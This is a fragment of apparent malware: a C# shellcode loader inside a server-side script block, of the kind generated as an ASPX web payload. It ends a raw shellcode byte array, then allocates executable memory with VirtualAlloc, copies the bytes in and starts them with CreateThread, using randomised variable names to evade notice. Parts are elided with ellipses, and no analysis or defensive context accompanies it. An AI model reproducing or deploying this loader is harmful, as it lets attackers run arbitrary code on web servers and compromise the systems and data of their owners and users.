...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr ggwyqsQ = VirtualAlloc(IntPtr.Zero,(UIntPtr)a8E2cTNw1.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(a8E2cTNw1,0,ggwyqsQ,a8E2cTNw1.Length);
        IntPtr aziI = IntPtr.Zero;
        IntPtr u3lfFc9HWO5n = CreateThread(IntPtr.Zero,UIntPtr.Zero,ggwyqsQ,IntPtr.Zero,0,ref aziI);
    }
</script>
